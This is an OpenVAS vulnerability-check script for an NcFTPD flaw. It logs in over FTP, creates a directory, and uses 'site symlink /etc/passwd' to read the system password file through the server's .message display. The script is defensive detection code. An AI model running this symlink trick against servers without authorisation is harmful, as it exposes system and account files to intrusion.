###############################################################################
# OpenVAS Vulnerability Test
# $Id: ncftpd_35822.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# NcFTPD Symbolic Link Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "NcFTPD is prone to a remote information-disclosure vulnerability.

Remote attackers can exploit this issue to view sensitive information.
Information obtained may lead to further attacks.

NcFTPD 2.8.5 is vulnerable; other versions may also be affected.";

if (description)
{
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/35822");
 script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/52067");
 script_xref(name : "URL" , value : "http://www.ncftpd.com/ncftpd/");
 script_oid("1.3.6.1.4.1.25623.1.0.100250");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-07-28 21:43:08 +0200 (Tue, 28 Jul 2009)");
 script_bugtraq_id(35822);
 script_tag(name:"cvss_base", value:"4.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:N/A:N");
 script_name("NcFTPD Symbolic Link Information Disclosure Vulnerability");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_GATHER_INFO);
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_mandatory_keys("ftp/ncftpd");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(get_kb_item('ftp/'+ftpPort+'/broken'))exit(0);
if(!get_kb_item("ftp/ncftpd"))exit(0);

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user || !pass)exit(0);
if("anonymous" >< user)exit(0);

if(!get_port_state(ftpPort)){
  exit(0);
}

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

domain = get_kb_item("Settings/third_party_domain");
if(isnull(domain)) {
 domain = this_host_name();;
}    

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

if(login_details)
{
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(ftpPort2)
  {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
    if(soc2) {

      dir = string("openvas_", rand());

       mkdir =  ftp_send_cmd(socket: soc1, cmd:string("MKD ", dir));
       if(mkdir =~ "257.*directory created") { 
          slink = ftp_send_cmd(socket: soc1, cmd:string("site symlink /etc/passwd ", dir,"/.message"));
  	  if(slink =~ "250 Symlinked") { 
            cd = ftp_send_cmd(socket: soc1, cmd:string("CWD ", dir));
            if("root" >< cd )  {
       
              close(soc2);
	      ftp_close(socket:soc1);
	      close(soc1);

              info = string("Here are the contents of the file '/etc/passwd' that\nwas read from the remote host:\n\n");
              info += cd;
              info += string("\n\nPlease delete the directory ");
              info += dir;
              info += string(" immediately.\n");

	      security_message(port:ftpPort, data:info);
	      exit(0);
	    }  
	  }  
       }

      close(soc2);
    }
  }

   ftp_close(socket:soc1);
   close(soc1);
   exit(0);

}

exit(0); 

     
